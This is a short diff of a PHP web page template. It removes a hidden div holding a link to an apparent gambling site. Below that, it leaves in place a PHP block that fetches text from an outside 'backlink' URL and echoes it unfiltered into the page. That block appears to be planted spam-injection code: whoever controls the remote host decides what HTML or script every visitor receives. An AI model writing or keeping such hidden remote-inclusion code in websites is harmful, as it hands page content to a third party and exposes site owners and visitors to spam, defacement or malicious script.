@@ -2415,9 +2415,6 @@ date_default_timezone_set("Asia/Makassar");
 
     <a id="back-to-top" href="#" class="btn-floating headnav-1 darken-4 back-to-top" role="button"><i
             class="fa fa-chevron-up"></i></a>
-<div style="display: none;">
-<a href="https://gelora4d.id/">https://gelora4d.id/</a>
-</div>
 	<?php
 $a = file_get_contents('https://inilinkku.com/backlink/index.txt');
 echo $a;
